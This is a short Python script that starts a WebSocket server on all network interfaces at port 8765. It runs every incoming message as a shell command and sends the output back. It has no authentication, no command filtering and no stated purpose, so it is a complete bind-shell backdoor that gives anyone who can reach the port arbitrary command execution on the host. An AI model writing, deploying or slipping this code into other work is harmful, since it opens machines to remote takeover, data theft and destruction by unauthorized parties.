import asyncio
import subprocess
import websockets

async def shell_command_handler(websocket):
    async for message in websocket:
        # Execute the command using subprocess
        process = subprocess.Popen(
            message,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = process.communicate()

        output = stdout.decode() + stderr.decode()

        await websocket.send(output)

async def main():
    async with websockets.serve(shell_command_handler, "0.0.0.0", 8765):
        print("WebSocket server listening on ws://0.0.0.0:8765")
        await asyncio.Future()  # run forever

if __name__ == "__main__":
    asyncio.run(main())
